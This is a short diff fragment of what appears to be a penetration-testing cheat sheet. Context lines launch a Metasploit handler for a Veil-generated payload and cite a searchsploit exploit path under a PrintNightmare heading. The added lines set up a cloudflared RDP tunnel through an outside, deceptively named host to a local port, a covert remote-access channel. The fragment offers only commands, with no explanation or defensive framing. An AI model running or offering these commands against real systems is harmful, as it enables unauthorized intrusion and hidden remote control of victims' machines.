@@ -1544,6 +1544,8 @@ msfconsole -r /var/lib/veil/output/handlers/payload1.rc
 -----------------------------------------------------searchsploit--------------------------------
 multiple/remote/46034.py
 
+---------------------------------------------------cloudflared------------------------------------
+cloudflared access rdp --hostname tun.pdfmerge.work --url rdp://localhost:53
 
 -----------------------------------------------------printnightmare------------------------------
 For those who are struggling with printnightmare:
